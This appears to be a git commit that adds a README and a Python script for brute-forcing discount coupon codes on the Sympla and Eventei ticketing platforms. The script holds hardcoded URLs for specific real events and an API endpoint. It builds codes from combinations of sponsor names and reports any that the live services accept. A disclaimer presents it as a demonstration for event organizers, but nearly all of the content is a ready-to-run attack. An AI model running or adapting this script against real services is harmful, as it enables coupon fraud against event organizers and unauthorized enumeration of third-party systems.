11f2e2c71b65fbf61e1e00e0adf8342be9cd3ee7
Enderson Menezes <endersonmenezes@outlook.com>
2020-08-24 12:28:57 -0300

    Initial commit

---
+++ README.md
@@ -0,0 +1,24 @@
+# Brute Force with Python Demonstration
+
+This repository serves to better organize and maintain the [old Gist](https://gist.github.com/endersonmenezes/f73b043efea0b5415fe02796d8829454).
+
+**English**
+
+Your console will display a list of available discount coupons. Do not use this code to gain advantage or illegally enter the event. Code just to demonstrate that creating discount coupons in sympla and other sites using simple word combinations can be hacked. This gist serves to show how social engineering be taken care of by event organizations. To event organizers please create discount coupon processes and tracking processes.
+
+**Portuguese**
+
+Seu console exibirá uma lista de cupons de desconto disponíveis. Não use este código para obter vantagem ou entrar ilegalmente no evento. Código apenas para demonstrar que a criação de cupons de desconto em sympla e outros sites usando combinações de palavras simples pode ser hackeada. Essa essência serve para mostrar como a engenharia social deve ser cuidada por organizações de eventos. Para os organizadores do evento, crie processos de cupons de desconto e processos de rastreamento.
+
+
+## Dependency Install
+
+```bash
+conda create --name bruteforce-python --file requirements.txt
+```
+
+## Running
+
+```bash
+python main.py
+```
---
+++ main.py
@@ -0,0 +1,61 @@
+#  Copyright (c) 2018-2020. Enderson Menezes Cândido [www.endersonmenezes.com.br]
+#  Your console will display a list of available discount coupons.
+#  Do not use this code to gain advantage or illegally enter the event.
+#  Code just to demonstrate that creating discount coupons in sympla using simple word combinations can be hacked.
+#  This gist serves to show how social engineering be taken care of by event organizations.
+#  To event organizers please create discount coupon processes and tracking processes.
+#  Working Since 2018
+
+import requests
+import itertools
+
+
+URL_SYMPLA = 'https://www.sympla.com.br/ticnova-2019__594324?d='
+URL_EVENTEI = 'http://eventei.com/details.html?event=2c0b6270-dc41-11ea-8598-f1bb3737cf34#ingressos'
+URL_API_VOUCHER = 'https://enjoyleads-api.herokuapp.com/shopping/voucher/2c0b6270-dc41-11ea-8598-f1bb3737cf34/'
+SCRIPTMODE = 1  # Use 2 for Sympla
+
+
+def transform_url_eventei(url_eventei):
+    url_eventei = url_eventei.split('=')
+    url_eventei = url_eventei[1]
+    url_eventei = url_eventei.split('#')
+    url_eventei = url_eventei[0]
+    return 'https://enjoyleads-api.herokuapp.com/shopping/voucher/{}'.format(url_eventei)
+
+
+def test_cupom_code_eventei(cupomcode):
+    url_api_eventei = transform_url_eventei(URL_EVENTEI)
+    url_api_eventei = '{}/{}'.format(url_api_eventei, cupomcode)
+    req = requests.get(url_api_eventei).json()
+    if 'active' in req.keys():
+        if req['active']:
+            print('Cupom Ativo | Cupom: {}'.format(cupomcode))
+
+
+def test_cupom_code_sympla(cupomcode):
+    url = '{}{}'.format(URL_SYMPLA, cupomcode)
+    pagina = requests.get(str(url))
+    descontoinvalido = pagina.text.find('Código inválido')
+    if descontoinvalido == -1:
+        print('Cupom Ativo | Cupom: {}'.format(cupomcode))
+
+
+if __name__ == '__main__':
+    # 2019 AND 2018
+    # tentativasarray = ['TICNOVA', '2019', 'UNICESUMAR', 'SBM', 'CESUMAR', 'SOFTWAREBY', 'SOFTWAREBYMARINGA', 'ACCION',
+    #                    'BUYSOFT', 'GETCARD', 'TECNOSPEED', 'ALUNO', 'BYTEABYTE', 'ACIM', 'SEBRAE']
+    tentativasarray = ['TICNOVA', '2020', 'ACCION', 'ACIM', 'BUYSOFT', 'CBN', 'COCAMAR', 'COOPERCARD', 'COOPER',
+                       'EVENTEI', 'GETCARD', 'RGK4IT', 'SEBRAE', 'SOFTWAREBY', 'MARINGA', 'TECNOSPEED', 'WIFIRE',
+                       'BYTEABYTE']
+    for tentativa in range(2, 5):
+        tentativas_comb = itertools.product(tentativasarray, repeat=tentativa)
+        for item in tentativas_comb:
+            cupomcode = ''.join(item)
+            if SCRIPTMODE == 1:
+                test_cupom_code_eventei(cupomcode)
+            elif SCRIPTMODE == 2:
+                test_cupom_code_sympla(cupomcode)
+            else:
+                print('Configure o arquivo main.py')
+
